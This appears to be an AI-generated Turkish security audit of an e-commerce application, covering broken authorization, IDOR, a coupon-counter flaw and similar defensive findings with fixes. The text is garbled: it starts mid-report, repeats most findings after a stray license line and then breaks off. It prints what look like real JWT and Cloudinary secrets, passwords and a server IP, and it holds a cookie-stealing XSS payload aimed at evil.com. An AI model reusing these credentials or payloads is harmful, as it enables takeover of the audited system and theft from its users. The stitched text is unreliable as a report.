- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
